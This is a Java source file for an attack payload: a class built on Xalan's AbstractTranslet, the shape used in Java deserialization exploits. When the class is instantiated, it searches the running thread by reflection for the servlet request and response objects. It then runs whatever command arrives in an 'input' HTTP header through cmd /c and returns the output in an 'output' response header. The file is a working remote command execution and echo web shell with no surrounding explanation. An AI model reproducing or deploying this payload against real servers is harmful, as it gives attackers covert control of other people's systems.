public class ra extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
    static java.util.HashSet<java.lang.Object> h;
    static ClassLoader cl = Thread.currentThread().getContextClassLoader();
    static Class hsr;        // HTTPServletRequest.class
    static Class hsp;        // HTTPServletResponse.class
    static String[] cmd;
    static Object r;
    static Object p;

    public ra()
    {
        r = null;
        p = null;
        h = new java.util.HashSet<java.lang.Object>();
        try {
            hsr = cl.loadClass("javax.servlet.http.HttpServletRequest");
            hsp = cl.loadClass("javax.servlet.http.HttpServletResponse");
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        F(Thread.currentThread(),0);
    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {

    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {

    }

    private static boolean i(Object obj){
        if(obj==null || h.contains(obj)){
            return true;
        }
        h.add(obj);         // Blacklist could be added here to improve
        return false;
    }

    private static void p(Object o, int depth){
        if(depth > 52||(r !=null&& p !=null)){
            return;
        }
        if(!i(o)){
            if(r ==null && hsr.isAssignableFrom(o.getClass())){
                r = o;
                try {
                    String command = (String)hsr.getMethod("getHeader",new Class[]{String.class}).invoke(o,"input");
                    cmd = new String[]{"cmd", "/c", command};
                    if(command == null) {
                        r = null;
                    }else{
                        // System.out.println("find Request");
                        try {
                            java.lang.reflect.Method getResponse = r.getClass().getMethod("getResponse");
                            p = getResponse.invoke(r);
                        } catch (Exception e) {
                            // System.out.println("getResponse Error");
                            r=null;
                            e.printStackTrace();
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }else if(p ==null&&hsp.isAssignableFrom(o.getClass())){
                p =  o;
            }
            if(r !=null&& p !=null){
                try {
//                    java.io.PrintWriter pw =  (java.io.PrintWriter)hsp.getMethod("getWriter").invoke(p);
//                    pw.println(new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next());
//                    pw.flush();
//                    pw.close();
                    ((javax.servlet.http.HttpServletResponse) p).addHeader("output", new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next());
                }catch (Exception e){}
                return;
            }
            F(o,depth+1);
        }
    }
    private static void F(Object start, int depth){
        Class n=start.getClass();
        do{
            for (java.lang.reflect.Field declaredField : n.getDeclaredFields()) {
                declaredField.setAccessible(true);
                try{
                    Object o = declaredField.get(start);
                    if(!o.getClass().isArray()){
                        p(o,depth);
                    }else{
                        for (Object q : (Object[]) o) {
                            p(q, depth);
                        }
                    }
                }catch (Exception e){
                }
            }
        }while((n = n.getSuperclass())!=null);
    }
}
